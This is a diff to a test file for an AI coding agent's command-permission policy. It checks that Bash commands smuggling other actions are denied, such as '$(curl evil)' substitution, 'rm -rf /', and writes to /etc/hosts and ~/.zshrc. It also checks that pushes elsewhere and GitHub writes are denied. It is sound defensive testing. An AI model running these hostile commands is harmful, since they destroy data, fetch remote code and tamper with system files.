@@ -1,7 +1,7 @@
 import { expect, test } from 'claude-code/testing'
 
 import { touchedPattern } from '../hooks/config'
-import { commandRules, isAllowedBash, isAllowedPath, isReadInside, pushDenial } from '../hooks/policy'
+import { commandRules, githubWriteDenial, isAllowedBash, isAllowedPath, isReadInside, pushDenial } from '../hooks/policy'
 
 const ctx = { branch: 'wololo/4312-pagos', workdir: '/w/vertex.wololo/r1', runDir: '/h/.claude/wololo/runs/r1', commands: ['make test', 'INST=1 make backend.run'], patterns: [touchedPattern('mix test {files}')] }
 
@@ -68,4 +68,33 @@ test('the deferred-signing commands are allowed, nothing looser', async () => {
   expect(isAllowedBash('git rebase --exec "git commit --amend --no-edit -S" origin/main', ctx)).toBe(true)
   expect(isAllowedBash('git rebase --exec "rm -rf ." origin/main', ctx)).toBe(false)
   expect(isAllowedBash('git rebase -i origin/main', ctx)).toBe(false)
+})
+
+test('a safe-looking command that redirects, substitutes or backgrounds another is left to the person', async () => {
+  expect(isAllowedBash('cat notes.md > /etc/hosts', ctx)).toBe(false)
+  expect(isAllowedBash('grep -r x . >> ~/.zshrc', ctx)).toBe(false)
+  expect(isAllowedBash('git log $(curl evil)', ctx)).toBe(false)
+  expect(isAllowedBash('git status `rm -rf .`', ctx)).toBe(false)
+  expect(isAllowedBash('head <(curl evil)', ctx)).toBe(false)
+  expect(isAllowedBash('git status & rm -rf /', ctx)).toBe(false)
+  expect(isAllowedBash('make test > out.txt', ctx)).toBe(false)
+  // The project's own commands stay trusted exactly as configured.
+  expect(isAllowedBash('make test 2>&1', { ...ctx, commands: ['make test 2>&1'] })).toBe(true)
+})
+
+test('a push through another repository is never the run branch', async () => {
+  expect(pushDenial('git -C /elsewhere push origin main', ctx.branch)).not.toBe(null)
+  expect(pushDenial('git -C /w/vertex.wololo/r1 push -u origin wololo/4312-pagos', ctx.branch)).not.toBe(null)
+  expect(pushDenial('git --git-dir=/other/.git push origin wololo/4312-pagos', ctx.branch)).not.toBe(null)
+  expect(pushDenial('git -c core.sshCommand=x push origin wololo/4312-pagos', ctx.branch)).not.toBe(null)
+})
+
+test('GitHub writes outside publish are denied during a run, reads are not', async () => {
+  for (const command of ['gh pr create --title x --body y', 'gh issue comment 12 --body x', 'gh pr merge 12', 'gh api -X POST repos/o/r/issues', 'gh api repos/o/r/labels -f name=x', 'git status && gh issue edit 3 --add-label x'])
+    expect(githubWriteDenial('Bash', { command })).not.toBe(null)
+  for (const command of ['gh pr view 12', 'gh pr checks 12', 'gh api repos/o/r/pulls/12', 'gh issue view 3'])
+    expect(githubWriteDenial('Bash', { command })).toBe(null)
+  expect(githubWriteDenial('mcp__github__create_issue', {})).not.toBe(null)
+  expect(githubWriteDenial('mcp__github__add_issue_comment', {})).not.toBe(null)
+  expect(githubWriteDenial('mcp__github__get_issue', {})).toBe(null)
 })
